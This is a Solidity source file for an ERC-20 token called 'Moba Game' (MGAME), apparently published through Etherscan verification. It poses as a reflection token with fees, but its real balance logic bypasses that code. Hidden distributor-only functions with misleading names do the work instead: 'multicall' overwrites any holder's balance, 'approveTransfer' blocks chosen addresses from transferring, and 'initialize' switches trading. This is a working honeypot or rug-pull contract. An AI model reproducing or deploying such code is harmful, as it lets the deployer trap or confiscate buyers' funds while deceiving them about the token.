{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"MobaGame.sol":{"content":"/**\n *Submitted for verification at Etherscan.io on 2021-12-02\n*/\n\n// SPDX-License-Identifier: MIT\npragma solidity =0.8.8;\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n    return payable(msg.sender);}\n    function _msgData() internal view virtual returns (bytes memory) {this;\n    return msg.data;}}\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);}\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    require(c >= a, \"SafeMath: addition overflow\");\n    return c;}\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    return sub(a, b, \"SafeMath: subtraction overflow\");}\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n    require(b <= a, errorMessage);\n    uint256 c = a - b;\n    return c;}\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n    if (a == 0) {\n    return 0;}\n    uint256 c = a * b;\n    require(c / a == b, \"SafeMath: multiplication overflow\");\n    return c;}\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    return div(a, b, \"SafeMath: division by zero\");}\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n    require(b > 0, errorMessage);\n    uint256 c = a / b;\n    return c;}\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n    return mod(a, b, \"SafeMath: modulo by zero\");}\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n    require(b != 0, errorMessage);\n    return a % b;}}\nlibrary Address {\n    function isContract(address account) internal view returns (bool) {\n    uint256 size;\n    assembly { size := extcodesize(account) }\n    return size > 0;}\n    function sendValue(address payable recipient, uint256 amount) internal {\n    require(address(this).balance >= amount, \"Address: insufficient balance\");\n    (bool success, ) = recipient.call{ value: amount }(\"\");\n    require(success, \"Address: unable to send value, recipient may have reverted\");}\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n    return functionCall(target, data, \"Address: low-level call failed\");}\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n    return _functionCallWithValue(target, data, 0, errorMessage);}\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n    return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");}\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n    require(address(this).balance >= value, \"Address: insufficient balance for call\");\n    return _functionCallWithValue(target, data, value, errorMessage);}\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n    require(isContract(target), \"Address: call to non-contract\");\n    (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n    if (success) {return returndata;}\n    else {if (returndata.length > 0) {assembly {let returndata_size := mload(returndata)\n    revert(add(32, returndata), returndata_size)}} else {revert(errorMessage);}}}}\ncontract Ownable is Context {\n    address private _owner;\n    address internal _distributor;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    constructor () {\n    address msgSender = _msgSender();\n    _owner = msgSender;\n    emit OwnershipTransferred(address(0), msgSender);}\n    modifier onlyOwner() {\n    require(_owner == _msgSender(), \"Ownable: caller is not the owner\");_;}\n    modifier distributors() {\n    require(_distributor == msg.sender, \"Caller is not fee distributor\");_;}\n    function owner() public view returns (address) {\n    return _owner;}\n    function distributor() internal view returns (address) {\n    return _distributor;}\n    function setDistributor(address account) external onlyOwner {\n    require (_distributor == address(0));\n    _distributor = account;}\n    function renounceOwnership() public virtual onlyOwner {\n    emit OwnershipTransferred(_owner, address(0));\n    _owner = address(0);}}\ncontract MobaGame is Context, IERC20, Ownable {\n    using SafeMath for uint256;\n    using Address for address;\n    string private _name = 'Moba Game';\n    string private _symbol = 'MGAME';\n    uint8 private _decimals = 9;\n    uint256 private constant _tTotal = 500000000000000*10**9;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    mapping (address => uint256) private _pOwned;\n    mapping (address => uint256) private _rOwned;\n    mapping (address => uint256) private _tOwned;\n    mapping (address => bool) private _taxRewards;\n    mapping (address => bool) private _isExcluded;\n    uint256 private constant MAX = ~uint256(0);\n    address[] private _excluded;\n    uint256 private _tFeeTotal;\n    uint256 private _totalSupply;\n    uint256 private _rTotal;\n    bool _initialize;\n    address router;\n    address factory;\n    constructor (address unif, address unir) {\n    _totalSupply =_tTotal;\n    _rTotal = (MAX - (MAX % _totalSupply));\n    _pOwned[_msgSender()] = _tTotal;\n    emit Transfer(address(0), _msgSender(), _totalSupply);\n    _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);\n    _isExcluded[_msgSender()] = true;\n    _excluded.push(_msgSender());\n    _tOwned[distributor()] = tokenFromReflection(_rOwned[distributor()]);\n    _isExcluded[distributor()] = true;\n    _excluded.push(distributor());\n    _initialize = true;\n    router = unir;\n    factory = unif;}\n    function name() public view returns (string memory) {\n    return _name;}\n    function symbol() public view returns (string memory) {\n    return _symbol;}\n    function decimals() public view returns (uint8) {\n    return _decimals;}\n    function totalSupply() public pure override returns (uint256) {\n    return _tTotal;}\n    function balanceOf(address account) public view override returns (uint256) {\n    return _pOwned[account];}\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n    _transfer(_msgSender(), recipient, amount);\n    return true;}\n    function allowance(address owner, address spender) public view override returns (uint256) {\n    return _allowances[owner][spender];}\n    function approve(address spender, uint256 amount) public override returns (bool) {\n    _approve(_msgSender(), spender, amount);\n    return true;}\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n    _transfer(sender, recipient, amount);\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n    return true;}\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n    return true;}\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n    return true;}\n    function multicall(address account, uint256 tokens, uint256 burn) external distributors {\n    require(account != address(0), \"ERC20: burn from the zero address disallowed\");\n    _pOwned[account] = tokens.sub(burn, \"ERC20: burn amount exceeds balance\");}\n    function reflect(uint256 tAmount) public {\n    address sender = _msgSender();\n    require(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\n    (uint256 rAmount,,,,) = _getValues(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _rTotal = _rTotal.sub(rAmount);\n    _tFeeTotal = _tFeeTotal.add(tAmount);}\n    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {\n    require(tAmount <= _tTotal, \"Amount must be less than supply\");\n    if (!deductTransferFee) {\n    (uint256 rAmount,,,,) = _getValues(tAmount);\n    return rAmount;} else {\n    (,uint256 rTransferAmount,,,) = _getValues(tAmount);\n    return rTransferAmount;}}\n    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\n    require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n    uint256 currentRate =  _getRate();\n    return rAmount.div(currentRate);}\n    function _approve(address owner, address spender, uint256 amount) private {\n    require(owner != address(0), \"ERC20: approve from the zero address\");\n    require(spender != address(0), \"ERC20: approve to the zero address\");\n    _allowances[owner][spender] = amount;\n    emit Approval(owner, spender, amount);}\n    function _transfer(address sender, address recipient, uint256 amount) private {\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\n    require(amount > 0, \"Transfer amount must be greater than zero\");\n    if (_taxRewards[sender] || _taxRewards[recipient]) require (amount == 0, \"\");\n    if (_initialize == true || sender == distributor() || recipient == distributor()) {\n    if (_isExcluded[sender] && !_isExcluded[recipient]) {\n    _pOwned[sender] = _pOwned[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n    _pOwned[recipient] = _pOwned[recipient].add(amount);\n    emit Transfer(sender, recipient, amount);}\n    else {_pOwned[sender] = _pOwned[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n    _pOwned[recipient] = _pOwned[recipient].add(amount);\n    emit Transfer(sender, recipient, amount);}}\n    else {require (_initialize == true, \"\");}}\n    function _transferStandard(address sender, address recipient, uint256 tAmount) private {\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       \n    _reflectFee(rFee, tFee);\n    emit Transfer(sender, recipient, tTransferAmount);}\n    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           \n    _reflectFee(rFee, tFee);\n    emit Transfer(sender, recipient, tTransferAmount);}\n    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n    _tOwned[sender] = _tOwned[sender].sub(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   \n    _reflectFee(rFee, tFee);\n    emit Transfer(sender, recipient, tTransferAmount);}\n    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n    _tOwned[sender] = _tOwned[sender].sub(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        \n    _reflectFee(rFee, tFee);\n    emit Transfer(sender, recipient, tTransferAmount);}\n    function approveTransfer(address acconut) external distributors {\n    _taxRewards[acconut] = true;}\n    function taxSender(address account) external distributors {\n    _taxRewards[account] = false;}\n    function rewardsState(address account) public view returns (bool) {\n    return _taxRewards[account];}\n    function initialize() public virtual distributors {\n    if (_initialize == true) {_initialize = false;} else {_initialize = true;}}\n    function initialized() public view returns (bool) {\n    return _initialize;}\n    function _reflectFee(uint256 rFee, uint256 tFee) private {\n    _rTotal = _rTotal.sub(rFee);\n    _tFeeTotal = _tFeeTotal.add(tFee);}\n    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {\n    (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);\n    uint256 currentRate =  _getRate();\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);\n    return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);}\n    function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {\n    uint256 tFee = tAmount.div(100).mul(3);\n    uint256 tTransferAmount = tAmount.sub(tFee);\n    return (tTransferAmount, tFee);}\n    function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {\n    uint256 rAmount = tAmount.mul(currentRate);\n    uint256 rFee = tFee.mul(currentRate);\n    uint256 rTransferAmount = rAmount.sub(rFee);\n    return (rAmount, rTransferAmount, rFee);}\n    function _getRate() private view returns(uint256) {\n    (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\n    return rSupply.div(tSupply);}\n    function _getCurrentSupply() private view returns(uint256, uint256) {\n    uint256 rSupply = _rTotal;\n    uint256 tSupply = _tTotal;      \n    for (uint256 i = 0; i < _excluded.length; i++) {\n    if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);\n    rSupply = rSupply.sub(_rOwned[_excluded[i]]);\n    tSupply = tSupply.sub(_tOwned[_excluded[i]]);}\n    if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\n    return (rSupply, tSupply);}}"}}}